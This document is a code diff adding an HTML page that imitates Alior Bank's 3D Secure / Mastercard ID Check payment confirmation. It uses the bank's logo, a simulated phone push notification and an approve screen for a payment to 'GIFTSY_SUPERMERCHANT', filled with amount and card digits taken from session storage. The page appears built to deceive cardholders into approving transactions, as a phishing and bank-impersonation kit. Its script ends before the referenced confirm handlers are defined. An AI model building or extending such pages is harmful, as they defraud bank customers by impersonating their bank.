@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>3D Secure – Potwierdzenie Transakcji</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html, body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  height: 100%;
+}
+
+/* ============================================================
+   DESKTOP VIEW
+   ============================================================ */
+#desktop-view {
+  display: flex;
+  flex-direction: column;
+  height: 100vh;
+  overflow: hidden;
+  background: #fff;
+}
+
+/* ---- header ---- */
+.desktop-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 14px 40px;
+  border-bottom: 1px solid #e8e8e8;
+  flex-shrink: 0;
+}
+
+.header-left { display: flex; align-items: center; gap: 20px; }
+
+.lang-selector {
+  font-size: 13px; color: #444; cursor: pointer;
+  display: flex; align-items: center; gap: 4px;
+}
+
+.cancel-btn {
+  color: #c0392b; font-size: 13px; font-weight: 700;
+  letter-spacing: .5px; cursor: pointer; transition: opacity .2s;
+}
+.cancel-btn:hover { opacity: .65; }
+
+.alior-logo-img {
+  height: 44px;
+  width: auto;
+  display: block;
+}
+
+.mastercard-logo { display: flex; align-items: center; gap: 8px; }
+.mc-wrap { position: relative; width: 44px; height: 28px; }
+.mc-red  { position: absolute; left: 0;  width: 28px; height: 28px; background: #EB001B; border-radius: 50%; }
+.mc-yel  { position: absolute; right: 0; width: 28px; height: 28px; background: #F79E1B; border-radius: 50%; opacity: .9; }
+.mc-txt  { font-size: 13px; font-weight: 600; color: #111; line-height: 1.25; }
+
+/* ---- main ---- */
+.desktop-main {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 40px;
+  overflow: hidden;
+  position: relative;
+}
+
+.page-content {
+  text-align: center;
+  max-width: 560px;
+  width: 100%;
+  animation: fadeUp .5s ease both;
+}
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(18px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+.page-content h1 {
+  font-size: 24px; font-weight: 700; color: #111; margin-bottom: 28px;
+}
+.page-content p { font-size: 14.5px; color: #333; line-height: 1.75; }
+.page-content p strong { font-weight: 700; }
+
+.tx-info {
+  margin-top: 10px; font-size: 14.5px; color: #333; line-height: 2.1;
+  background: #f8f8f8; border-radius: 10px; padding: 16px 20px;
+  text-align: left; display: inline-block; min-width: 280px;
+}
+
+/* ---- waiting indicator ---- */
+.waiting-indicator {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin-top: 40px;
+  gap: 16px;
+}
+
+.wi-dots {
+  display: flex;
+  gap: 10px;
+  align-items: center;
+}
+
+.wi-dot {
+  width: 14px; height: 14px;
+  border-radius: 50%;
+  background: #e0e0e0;
+  transition: background .35s ease, transform .35s ease;
+}
+
+.wi-dot.filled {
+  background: #27ae60;
+  transform: scale(1.1);
+}
+
+.waiting-note { font-size: 12px; color: #999; letter-spacing: .2px; }
+.waiting-note span::after {
+  content: ''; animation: ellipsis 1.8s infinite;
+}
+@keyframes ellipsis {
+  0%   { content: ''; }
+  33%  { content: '.'; }
+  66%  { content: '..'; }
+  100% { content: '...'; }
+}
+
+/* confirmed */
+.confirmed-wrap { display: none; text-align: center; animation: fadeUp .5s ease both; }
+.confirmed-check {
+  width: 64px; height: 64px; background: #27ae60; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 30px; color: white; margin: 0 auto 20px;
+  animation: popIn .5s cubic-bezier(.34,1.56,.64,1) both;
+}
+@keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
+.confirmed-wrap h2 { font-size: 22px; font-weight: 700; color: #111; margin-bottom: 8px; }
+.confirmed-wrap p  { font-size: 14px; color: #666; }
+
+/* ---- footer ---- */
+.desktop-footer { border-top: 1px solid #e8e8e8; padding: 0 40px; flex-shrink: 0; }
+.footer-row {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 14px 0; border-bottom: 1px solid #f0f0f0;
+  font-size: 14px; font-weight: 500; color: #111; cursor: pointer;
+}
+.footer-row:last-child { border: none; }
+.footer-plus { font-size: 22px; font-weight: 300; color: #555; }
+
+
+/* ============================================================
+   PHONE – fixed bottom-right corner (peeks up from bottom)
+   ============================================================ */
+.phone-corner {
+  position: fixed;
+  right: 48px;
+  bottom: 0;
+  z-index: 200;
+  animation: phoneRise .9s cubic-bezier(.34,1.56,.64,1) .7s both;
+  transform-origin: bottom center;
+}
+@keyframes phoneRise {
+  from { opacity: 0; transform: translateY(80px) scale(.94); }
+  to   { opacity: 1; transform: translateY(0) scale(1); }
+}
+
+.phone-frame {
+  width: 315px;
+  height: calc(100vh - 80px);
+  max-height: 645px;
+  min-height: 450px;
+  background: #111;
+  border-radius: 42px 42px 0 0;
+  padding: 9px 9px 0;
+  box-shadow:
+    0 0 0 1px #2a2a2a,
+    -10px -12px 48px rgba(0,0,0,.28),
+    10px  0   40px rgba(0,0,0,.18);
+  position: relative;
+}
+
+.phone-screen {
+  width: 100%;
+  height: 100%;
+  border-radius: 33px 33px 0 0;
+  overflow: hidden;
+  position: relative;
+  background: #000;
+  font-size: 16px;
+}
+
+/* dynamic island */
+.dyn-island {
+  position: absolute; top: 9px; left: 50%;
+  transform: translateX(-50%);
+  width: 68px; height: 20px;
+  background: #000; border-radius: 12px; z-index: 5;
+}
+
+/* lock screen */
+.lock-bg {
+  position: absolute; inset: 0;
+  background: linear-gradient(160deg,#e8892c 0%,#d4511a 20%,#c03a1c 45%,#8b3a8c 68%,#4a5ba0 85%,#2d4a7a 100%);
+  display: flex; flex-direction: column; align-items: center;
+  padding-top: 30px;
+  transition: filter .4s, opacity .3s; z-index: 1;
+}
+.lock-bg.blurred { filter: blur(5px) brightness(.62); }
+
+.ls-status {
+  display: flex; justify-content: space-between;
+  width: 100%; padding: 0 16px; font-size: 11px;
+  font-weight: 700; color: white; margin-bottom: 14px;
+}
+.ls-icons { display: flex; gap: 4px; align-items: center; }
+
+.ls-lock { font-size: 24px; color: white; opacity: .9; }
+.ls-time { font-size: 72px; font-weight: 200; color: white; letter-spacing: -3px; line-height: 1; }
+.ls-date { font-size: 15px; color: rgba(255,255,255,.85); margin-top: 4px; }
+
+.ls-bottom {
+  position: absolute; bottom: 16px; width: 100%;
+  display: flex; justify-content: space-around; padding: 0 24px;
+}
+.ls-btn {
+  width: 40px; height: 40px; border-radius: 50%;
+  background: rgba(255,255,255,.2);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 18px; color: white;
+}
+.ls-home {
+  position: absolute; bottom: 6px; left: 50%; transform: translateX(-50%);
+  width: 90px; height: 4px; background: rgba(255,255,255,.45); border-radius: 2px;
+}
+
+/* push notif on phone */
+.phone-notif {
+  position: absolute; top: 56px; left: 10px; right: 10px;
+  background: rgba(36,36,36,.97);
+  backdrop-filter: blur(22px);
+  border-radius: 18px; padding: 14px;
+  display: flex; align-items: flex-start; gap: 12px;
+  z-index: 10; opacity: 0;
+  transform: translateY(-18px) scale(.95);
+  transition: all .45s cubic-bezier(.34,1.56,.64,1);
+  cursor: pointer;
+}
+.phone-notif.show { opacity: 1; transform: translateY(0) scale(1); }
+.phone-notif.tap  { transform: scale(.97); opacity: .8; transition: all .08s; }
+
+.pn-icon {
+  width: 40px; height: 40px; border-radius: 10px;
+  background: #fff;
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  overflow: hidden;
+}
+.pn-icon img { width: 36px; height: 36px; object-fit: contain; }
+.pn-title { font-size: 13px; font-weight: 700; color: white; margin-bottom: 2px; }
+.pn-body  { font-size: 12px; color: rgba(255,255,255,.82); line-height: 1.45; }
+.pn-x     { font-size: 14px; color: rgba(255,255,255,.38); margin-left: auto; padding-left: 4px; flex-shrink: 0; }
+
+/* auth screen on phone */
+.phone-auth {
+  position: absolute; inset: 0; background: white;
+  z-index: 20; display: flex; flex-direction: column;
+  transform: translateY(100%);
+  transition: transform .5s cubic-bezier(.4,0,.2,1);
+}
+.phone-auth.show { transform: translateY(0); }
+
+.pa-head {
+  background: #8b0025; padding: 36px 16px 16px; flex-shrink: 0;
+  display: flex; flex-direction: column; align-items: center; gap: 8px;
+}
+.pa-head-logo { height: 28px; width: auto; display: block; }
+.pa-head h2 { color: white; font-size: 15px; font-weight: 700; }
+
+.pa-body { flex: 1; padding: 12px 14px; overflow-y: auto; }
+
+.pa-banner {
+  background: #e8f4fd; border: 1px solid #b8d9f0;
+  border-radius: 10px; padding: 10px 12px;
+  display: flex; gap: 8px; margin-bottom: 14px;
+}
+.pa-banner p { font-size: 12px; color: #2c5f8a; font-weight: 500; line-height: 1.4; }
+
+.pa-row { padding-bottom: 10px; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; }
+.pa-row:last-child { border: none; }
+.pa-label { font-size: 13px; font-weight: 700; color: #111; margin-bottom: 2px; }
+.pa-val   { font-size: 12px; color: #666; }
+
+.pa-actions { padding: 10px 14px 18px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0; }
+.pa-confirm {
+  background: #8b0025; color: white; border: none;
+  border-radius: 10px; padding: 14px;
+  font-size: 14px; font-weight: 700;
+  cursor: pointer; transition: all .15s;
+}
+.pa-confirm:active { background: #6b001e; transform: scale(.98); }
+.pa-reject {
+  background: white; color: #8b0025; border: 1.5px solid #8b0025;
+  border-radius: 10px; padding: 14px;
+  font-size: 14px; font-weight: 700; cursor: pointer;
+}
+
+/* success on phone */
+.phone-success {
+  position: absolute; inset: 0; background: rgba(255,255,255,.96);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  z-index: 30; opacity: 0; pointer-events: none; transition: opacity .45s ease;
+}
+.phone-success.show { opacity: 1; pointer-events: all; }
+.ps-check {
+  width: 60px; height: 60px; background: #27ae60; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 30px; color: white;
+  animation: popIn .4s cubic-bezier(.34,1.56,.64,1) both;
+}
+.ps-label { margin-top: 12px; font-size: 14px; font-weight: 700; color: #111; }
+
+
+/* ============================================================
+   MOBILE VIEW  (< 768px)
+   ============================================================ */
+#mobile-view {
+  display: none;
+  min-height: 100vh;
+  background: #fff;
+  flex-direction: column;
+  position: relative;
+}
+
+/* top controls */
+.m-topbar {
+  display: flex;
+  align-items: center;
+  padding: 18px 16px 0;
+}
+.m-x { font-size: 24px; color: #333; cursor: pointer; line-height: 1; }
+
+.m-subbar {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 10px 16px 14px;
+  border-bottom: 1px solid #e8e8e8;
+}
+.m-lang   { font-size: 14px; color: #444; }
+.m-cancel { color: #c0392b; font-size: 14px; font-weight: 700; letter-spacing: .4px; cursor: pointer; }
+
+/* logos */
+.m-logos {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 16px 20px;
+  border-bottom: 1px solid #e8e8e8;
+}
+.m-alior-logo { height: 40px; width: auto; display: block; }
+.m-mc-wrap { position: relative; width: 52px; height: 32px; }
+.m-mc-r { position: absolute; left: 0;  width: 32px; height: 32px; background: #EB001B; border-radius: 50%; }
+.m-mc-y { position: absolute; right: 0; width: 32px; height: 32px; background: #F79E1B; border-radius: 50%; opacity: .9; }
+
+/* main body */
+.m-body {
+  flex: 1; padding: 28px 24px 20px;
+  text-align: center;
+}
+.m-body h1 { font-size: 21px; font-weight: 700; color: #111; margin-bottom: 20px; }
+.m-body p  { font-size: 15px; color: #333; line-height: 1.8; }
+.m-txinfo  {
+  margin-top: 16px; font-size: 14px; color: #333; line-height: 2;
+  background: #f8f8f8; border-radius: 10px; padding: 14px 18px;
+  text-align: left;
+}
+
+/* mobile footer */
+.m-footer { border-top: 1px solid #e8e8e8; padding: 0 20px; margin-top: auto; }
+.m-frow {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 17px 0; border-bottom: 1px solid #f0f0f0;
+  font-size: 15px; font-weight: 600; color: #111; cursor: pointer;
+}
+.m-frow:last-child { border: none; }
+.m-fplus { font-size: 24px; font-weight: 300; color: #555; }
+
+/* ---- mobile push notification ---- */
+.m-push {
+  position: fixed; top: 56px; left: 12px; right: 12px;
+  background: rgba(36,36,36,.97);
+  backdrop-filter: blur(24px);
+  border-radius: 20px; padding: 14px 14px;
+  display: flex; align-items: flex-start; gap: 12px;
+  z-index: 100; opacity: 0;
+  transform: translateY(-28px) scale(.96);
+  transition: all .5s cubic-bezier(.34,1.56,.64,1);
+  cursor: pointer;
+  box-shadow: 0 10px 40px rgba(0,0,0,.38);
+}
+.m-push.show { opacity: 1; transform: translateY(0) scale(1); }
+.m-push.tap  { transform: scale(.98); opacity: .8; transition: all .08s; }
+
+.m-push-ico {
+  width: 44px; height: 44px; border-radius: 11px;
+  background: #fff;
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  overflow: hidden;
+}
+.m-push-ico img { width: 38px; height: 38px; object-fit: contain; }
+.m-push-title { font-size: 13.5px; font-weight: 700; color: white; margin-bottom: 3px; }
+.m-push-body  { font-size: 12.5px; color: rgba(255,255,255,.83); line-height: 1.45; }
+.m-push-x { font-size: 14px; color: rgba(255,255,255,.38); margin-left: auto; padding-left: 6px; flex-shrink: 0; }
+
+/* ---- mobile auth screen ---- */
+.m-auth {
+  position: fixed; inset: 0; background: white;
+  z-index: 200; display: flex; flex-direction: column;
+  transform: translateY(100%);
+  transition: transform .52s cubic-bezier(.4,0,.2,1);
+}
+.m-auth.show { transform: translateY(0); }
+
+.m-ah {
+  background: #8b0025; padding: 52px 20px 16px;
+  display: flex; flex-direction: column; align-items: center; gap: 6px; flex-shrink: 0;
+}
+.m-ah-logo { height: 32px; width: auto; display: block; }
+.m-ah h2 { color: white; font-size: 18px; font-weight: 700; }
+
+.m-ab { flex: 1; padding: 14px 20px; overflow-y: auto; }
+
+.m-abanner {
+  background: #e8f4fd; border: 1px solid #b8d9f0;
+  border-radius: 12px; padding: 13px 15px;
+  display: flex; gap: 10px; margin-bottom: 18px;
+}
+.m-abanner p { font-size: 13.5px; color: #2c5f8a; font-weight: 500; line-height: 1.45; }
+
+.m-det { padding-bottom: 14px; margin-bottom: 14px; border-bottom: 1px solid #f0f0f0; }
+.m-det:last-child { border: none; }
+.m-dlabel { font-size: 14.5px; font-weight: 700; color: #111; margin-bottom: 2px; }
+.m-dval   { font-size: 14.5px; color: #666; }
+
+.m-aa { padding: 12px 20px 40px; display: flex; flex-direction: column; gap: 11px; flex-shrink: 0; }
+.m-aok {
+  background: #8b0025; color: white; border: none;
+  border-radius: 13px; padding: 18px;
+  font-size: 16px; font-weight: 700;
+  cursor: pointer; transition: all .15s;
+}
+.m-aok:active { background: #6b001e; transform: scale(.98); }
+.m-ano {
+  background: white; color: #8b0025; border: 2px solid #8b0025;
+  border-radius: 13px; padding: 18px;
+  font-size: 16px; font-weight: 700; cursor: pointer;
+}
+
+/* ---- mobile success ---- */
+.m-success {
+  position: fixed; inset: 0; background: white;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  z-index: 300; opacity: 0; pointer-events: none;
+  transition: opacity .5s ease;
+}
+.m-success.show { opacity: 1; pointer-events: all; }
+.m-scheck {
+  width: 76px; height: 76px; background: #27ae60; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 38px; color: white;
+  animation: popIn .5s cubic-bezier(.34,1.56,.64,1) both;
+}
+.m-stitle { margin-top: 20px; font-size: 21px; font-weight: 700; color: #111; animation: fadeUp .4s ease .2s both; }
+.m-ssub   { margin-top: 7px; font-size: 14px; color: #666; animation: fadeUp .4s ease .3s both; }
+
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 767px) {
+  html, body { overflow: auto; height: auto; }
+  #desktop-view { display: none !important; }
+  #mobile-view  { display: flex; }
+  .phone-corner { display: none; }
+}
+
+/* Smaller desktop – phone doesn't overlap text */
+@media (min-width: 768px) and (max-width: 1100px) {
+  .desktop-main { padding-right: 380px; }
+  .phone-corner { right: 16px; }
+  .phone-frame {
+    width: 270px;
+    max-height: 560px;
+    min-height: 400px;
+  }
+}
+
+@media (min-width: 768px) and (max-width: 900px) {
+  .desktop-header { padding: 12px 20px; }
+  .desktop-footer { padding: 0 20px; }
+  .desktop-main { padding: 24px 20px; padding-right: 320px; }
+  .phone-corner { right: 8px; }
+  .phone-frame {
+    width: 240px;
+    max-height: 500px;
+  }
+  .alior-logo-img { height: 36px; }
+}
+</style>
+</head>
+<body>
+
+<!-- ================================================================
+     DESKTOP
+     ================================================================ -->
+<div id="desktop-view">
+
+  <header class="desktop-header">
+    <div class="header-left">
+      <img class="alior-logo-img" src="icons/alior-bank-logo.svg" alt="Alior Bank">
+      <span class="lang-selector">Polski (Pols…&nbsp;▾</span>
+    </div>
+    <span class="cancel-btn">ANULUJ</span>
+    <div class="mastercard-logo">
+      <div class="mc-wrap"><div class="mc-red"></div><div class="mc-yel"></div></div>
+      <div class="mc-txt">mastercard<br>ID Check</div>
+    </div>
+  </header>
+
+  <main class="desktop-main">
+    <!-- waiting -->
+    <div class="page-content" id="desk-wait">
+      <h1>Potwierdzenie Transakcji</h1>
+      <p>Na Twoje urządzenie do autoryzacji mobilnej wysłaliśmy powiadomienie dotyczące poniższej płatności.</p>
+      <p>Zweryfikuj i potwierdź tę płatność w <strong>aplikacji mobilnej Twojego Banku.</strong></p>
+      <div class="tx-info" id="desk-txinfo">
+        <p>Sklep: GIFTSY_SUPERMERCHANT</p>
+        <p>Kwota: — EUR</p>
+        <p>Data: —</p>
+        <p>Numer karty: ************—</p>
+      </div>
+      <div class="waiting-indicator">
+        <div class="wi-dots">
+          <div class="wi-dot" id="wd1"></div>
+          <div class="wi-dot" id="wd2"></div>
+          <div class="wi-dot" id="wd3"></div>
+          <div class="wi-dot" id="wd4"></div>
+        </div>
+        <p class="waiting-note">Oczekiwanie na potwierdzenie w aplikacji<span></span></p>
+      </div>
+    </div>
+
+    <!-- confirmed -->
+    <div class="confirmed-wrap" id="desk-ok">
+      <div class="confirmed-check">✓</div>
+      <h2>Płatność potwierdzona!</h2>
+      <p id="desk-ok-amount">Transakcja została autoryzowana.</p>
+    </div>
+  </main>
+
+  <footer class="desktop-footer">
+    <div class="footer-row">Dowiedz się więcej <span class="footer-plus">+</span></div>
+    <div class="footer-row">Skontaktuj się z nami <span class="footer-plus">+</span></div>
+  </footer>
+</div>
+
+<!-- ================================================================
+     PHONE – fixed bottom-right
+     ================================================================ -->
+<div class="phone-corner">
+  <div class="phone-frame" id="phone-frame">
+    <div class="phone-screen">
+      <div class="dyn-island"></div>
+
+      <!-- lock screen -->
+      <div class="lock-bg" id="lock-bg">
+        <div class="ls-status">
+          <span>●●●●</span>
+          <div class="ls-icons">
+            <svg width="11" height="9" viewBox="0 0 11 9"><rect x="0" y="3" width="2" height="6" fill="white"/><rect x="3" y="1.5" width="2" height="7.5" fill="white"/><rect x="6.5" y="0" width="2" height="9" fill="white"/></svg>
+            <svg width="11" height="9" viewBox="0 0 11 9"><path d="M5.5 1.5C3.5 1.5 1.7 2.4.4 3.8l1.5 1.6C3 4.4 4.2 3.8 5.5 3.8s2.5.6 3.6 1.6l1.5-1.6C9.3 2.4 7.5 1.5 5.5 1.5zm0 3.5c-1.1 0-2 .5-2.7 1.2L4.4 7.9l1.1 1.1 1.1-1.1 1.6-1.7C7.5 5.5 6.6 5 5.5 5z" fill="white"/></svg>
+            <svg width="18" height="9" viewBox="0 0 18 9"><rect x="0" y="1" width="15" height="7" rx="1.8" stroke="white" stroke-width="1.2" fill="none"/><rect x="15.2" y="2.8" width="2.2" height="3.4" rx="1.1" fill="white"/><rect x="1.2" y="2.2" width="10" height="4.6" rx=".9" fill="white"/></svg>
+          </div>
+        </div>
+        <div class="ls-lock">🔒</div>
+        <div class="ls-time" id="phone-time">9:41</div>
+        <div class="ls-date" id="phone-date">wtorek, 18 lut</div>
+        <div class="ls-bottom">
+          <div class="ls-btn">🔦</div>
+          <div class="ls-btn">📷</div>
+        </div>
+        <div class="ls-home"></div>
+      </div>
+
+      <!-- push notification -->
+      <div class="phone-notif" id="phone-notif" onclick="desktopTapNotif()">
+        <div class="pn-icon">
+          <img src="icons/alior-bank-logo.svg" alt="Alior Bank">
+        </div>
+        <div style="flex:1">
+          <div class="pn-title">Alior Bank – Potwierdź płatność</div>
+          <div class="pn-body" id="pn-body-text">Płatność — EUR w GIFTSY_SUPERMERCHANT wymaga potwierdzenia.</div>
+        </div>
+        <div class="pn-x">✕</div>
+      </div>
+
+      <!-- auth screen -->
+      <div class="phone-auth" id="phone-auth">
+        <div class="pa-head">
+          <span style="color:white;font-size:17px;font-weight:800;letter-spacing:.5px;">ALIOR BANK</span>
+          <h2>Uwierzytelnienie operacji</h2>
+        </div>
+        <div class="pa-body">
+          <div class="pa-banner">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="#4a90d9" style="flex-shrink:0;margin-top:1px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+            <p>Nastąpiło automatyczne przekierowanie do aplikacji</p>
+          </div>
+          <div class="pa-row"><div class="pa-label">Szczegóły operacji</div><div class="pa-val" id="pa-detail-date">Operacja z dnia: —</div></div>
+          <div class="pa-row"><div class="pa-label">Rodzaj operacji</div><div class="pa-val">Transakcja kartą</div></div>
+          <div class="pa-row"><div class="pa-label">Nazwa karty</div><div class="pa-val" id="pa-card-name">Karta płatnicza</div></div>
+          <div class="pa-row"><div class="pa-label">Numer karty</div><div class="pa-val" id="pa-card-num">**** **** **** —</div></div>
+          <div class="pa-row"><div class="pa-label">Odbiorca</div><div class="pa-val">GIFTSY_SUPERMERCHANT</div></div>
+          <div class="pa-row"><div class="pa-label">Kwota</div><div class="pa-val" id="pa-amount">— EUR</div></div>
+          <div class="pa-row"><div class="pa-label">Data transakcji</div><div class="pa-val" id="pa-tx-date">—</div></div>
+        </div>
+        <div class="pa-actions">
+          <button class="pa-confirm" onclick="desktopConfirm()">Zatwierdź</button>
+          <button class="pa-reject">Odrzuć</button>
+        </div>
+        <div class="phone-success" id="phone-success">
+          <div class="ps-check">✓</div>
+          <div class="ps-label" id="ps-label-text">Autoryzowano — EUR!</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+
+<!-- ================================================================
+     MOBILE VIEW – proper Alior 3DS page
+     ================================================================ -->
+<div id="mobile-view">
+
+  <div class="m-topbar">
+    <div class="m-x">✕</div>
+  </div>
+
+  <div class="m-subbar">
+    <span class="m-lang">Polski (Pols…&nbsp;⇅</span>
+    <span class="m-cancel">ANULUJ</span>
+  </div>
+
+  <div class="m-logos">
+    <img class="m-alior-logo" src="icons/alior-bank-logo.svg" alt="Alior Bank">
+    <div style="display:flex;align-items:center;gap:9px">
+      <div class="m-mc-wrap"><div class="m-mc-r"></div><div class="m-mc-y"></div></div>
+      <div style="font-size:15px;font-weight:600;color:#111;line-height:1.3">mastercard<br>ID Check</div>
+    </div>
+  </div>
+
+  <div class="m-body">
+    <h1>Potwierdzenie Transakcji</h1>
+    <p>Na Twoje urządzenie do autoryzacji mobilnej wysłaliśmy powiadomienie dotyczące poniższej płatności.</p>
+    <p>Zweryfikuj i potwierdź tę płatność w <strong>aplikacji mobilnej Twojego Banku.</strong></p>
+    <div class="m-txinfo" id="mob-txinfo">
+      <p>Sklep: GIFTSY_SUPERMERCHANT</p>
+      <p>Kwota: — EUR</p>
+      <p>Data: —</p>
+      <p>Numer karty: ************—</p>
+    </div>
+    <div class="waiting-indicator">
+      <div class="wi-dots">
+        <div class="wi-dot" id="mwd1"></div>
+        <div class="wi-dot" id="mwd2"></div>
+        <div class="wi-dot" id="mwd3"></div>
+        <div class="wi-dot" id="mwd4"></div>
+      </div>
+      <p class="waiting-note">Oczekiwanie na potwierdzenie w aplikacji<span></span></p>
+    </div>
+  </div>
+
+  <div class="m-footer">
+    <div class="m-frow">Dowiedz się więcej <span class="m-fplus">+</span></div>
+    <div class="m-frow">Skontaktuj się z nami <span class="m-fplus">+</span></div>
+  </div>
+
+  <!-- push notification -->
+  <div class="m-push" id="m-push" onclick="mobileTap()">
+    <div class="m-push-ico">
+      <img src="icons/alior-bank-logo.svg" alt="Alior Bank">
+    </div>
+    <div style="flex:1">
+      <div class="m-push-title">Alior Bank – Potwierdź płatność</div>
+      <div class="m-push-body" id="m-pn-body-text">Płatność — EUR w GIFTSY_SUPERMERCHANT wymaga potwierdzenia.</div>
+    </div>
+    <div class="m-push-x">✕</div>
+  </div>
+
+  <!-- auth screen -->
+  <div class="m-auth" id="m-auth">
+    <div class="m-ah">
+      <span style="color:white;font-size:20px;font-weight:800;letter-spacing:.5px;">ALIOR BANK</span>
+      <h2>Uwierzytelnienie operacji</h2>
+    </div>
+    <div class="m-ab">
+      <div class="m-abanner">
+        <span style="font-size:19px;flex-shrink:0">ℹ️</span>
+        <p>Nastąpiło automatyczne przekierowanie do aplikacji</p>
+      </div>
+      <div class="m-det"><div class="m-dlabel">Szczegóły operacji</div><div class="m-dval" id="m-detail-date">Operacja z dnia: —</div></div>
+      <div class="m-det"><div class="m-dlabel">Rodzaj operacji</div><div class="m-dval">Transakcja kartą</div></div>
+      <div class="m-det"><div class="m-dlabel">Nazwa karty</div><div class="m-dval" id="m-card-name">Karta płatnicza</div></div>
+      <div class="m-det"><div class="m-dlabel">Numer karty</div><div class="m-dval" id="m-card-num">**** **** **** —</div></div>
+      <div class="m-det"><div class="m-dlabel">Odbiorca</div><div class="m-dval">GIFTSY_SUPERMERCHANT</div></div>
+      <div class="m-det"><div class="m-dlabel">Kwota</div><div class="m-dval" id="m-amount">— EUR</div></div>
+      <div class="m-det"><div class="m-dlabel">Data transakcji</div><div class="m-dval" id="m-tx-date">—</div></div>
+    </div>
+    <div class="m-aa">
+      <button class="m-aok" onclick="mobileConfirm()">Zatwierdź</button>
+      <button class="m-ano">Odrzuć</button>
+    </div>
+  </div>
+
+  <!-- success -->
+  <div class="m-success" id="m-success">
+    <div class="m-scheck">✓</div>
+    <div class="m-stitle">Płatność autoryzowana!</div>
+    <div class="m-ssub" id="m-ssub-text">— EUR · GIFTSY_SUPERMERCHANT</div>
+  </div>
+
+</div>
+
+<script>
+/* -------------------------------------------------------
+   READ PAYMENT DATA FROM SESSION STORAGE
+------------------------------------------------------- */
+let payData = {};
+try {
+  const raw = sessionStorage.getItem('zenPaymentData');
+  if (raw) payData = JSON.parse(raw);
+} catch(e) {}
+
+// Today's date formatted as DD.MM.YYYY
+const now = new Date();
+const dd = String(now.getDate()).padStart(2, '0');
+const mm = String(now.getMonth() + 1).padStart(2, '0');
+const yyyy = now.getFullYear();
+const todayFmt = `${dd}.${mm}.${yyyy}`;
+
+// Lock screen clock
+const hours = String(now.getHours()).padStart(2, '0');
+const mins  = String(now.getMinutes()).padStart(2, '0');
+const dayNames = ['niedziela','poniedziałek','wtorek','środa','czwartek','piątek','sobota'];
+const monthNames = ['sty','lut','mar','kwi','maj','cze','lip','sie','wrz','paź','lis','gru'];
+const lockDateStr = `${dayNames[now.getDay()]}, ${now.getDate()} ${monthNames[now.getMonth()]}`;
+
+const cardLast4 = payData.cardLast4 || '—';
+const cardBrand = payData.cardBrand || 'Card';
+const currency  = payData.currency  || 'EUR';
+const amount    = payData.amount    || '—';
+
+// Format card display: **** **** **** XXXX
+const cardNumDisplay = `**** **** **** ${cardLast4}`;
+// Masked card with dashes: ****XXXX
+const cardNumMasked = `************${cardLast4}`;
+
+// Card name based on brand
+const cardNameMap = {
+  'Visa':       'Karta Visa płatnicza',
+  'Mastercard': 'Karta Debit Mastercard zbliżeniowa',
+};
+const cardName = cardNameMap[cardBrand] || 'Karta płatnicza';
+
+const amountFull = `${amount} ${currency}`;
+
+/* -------------------------------------------------------
+   UPDATE ALL DYNAMIC TEXT
+------------------------------------------------------- */
+function setText(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = val;
+}
+function setHTML(id, val) {
+  const el = document.getElementById(id);
+  if (el) el.innerHTML = val;
+}
+
+// Phone lock screen
+setText('phone-time', `${hours}:${mins}`);
+setText('phone-date', lockDateStr);
+
+// Desktop tx info block
+setHTML('desk-txinfo',
+  `<p>Sklep: GIFTSY_SUPERMERCHANT</p>` +
+  `<p>Kwota: ${amountFull}</p>` +
+  `<p>Data: ${todayFmt}</p>` +
+  `<p>Numer karty: ${cardNumMasked}</p>`
+);
+
+// Desktop confirmed
+setText('desk-ok-amount', `Transakcja ${amountFull} została autoryzowana.`);
+
+// Push notification body (desktop phone)
+setText('pn-body-text', `Płatność ${amountFull} w GIFTSY_SUPERMERCHANT wymaga potwierdzenia w aplikacji Alior Bank.`);
+
+// Phone auth screen
+setText('pa-detail-date', `Operacja z dnia: ${todayFmt}`);
+setText('pa-card-name', cardName);
+setText('pa-card-num', cardNumDisplay);
+setText('pa-amount', amountFull);
+setText('pa-tx-date', todayFmt);
+setText('ps-label-text', `Autoryzowano ${amountFull}!`);
+
+// Mobile tx info block
+setHTML('mob-txinfo',
+  `<p>Sklep: GIFTSY_SUPERMERCHANT</p>` +
+  `<p>Kwota: ${amountFull}</p>` +
+  `<p>Data: ${todayFmt}</p>` +
+  `<p>Numer karty: ${cardNumMasked}</p>`
+);
+
+// Mobile push notification body
+setText('m-pn-body-text', `Płatność ${amountFull} w GIFTSY_SUPERMERCHANT wymaga potwierdzenia w aplikacji Alior Bank.`);
+
+// Mobile auth screen
+setText('m-detail-date', `Operacja z dnia: ${todayFmt}`);
+setText('m-card-name', cardName);
+setText('m-card-num', cardNumDisplay);
+setText('m-amount', amountFull);
+setText('m-tx-date', todayFmt);
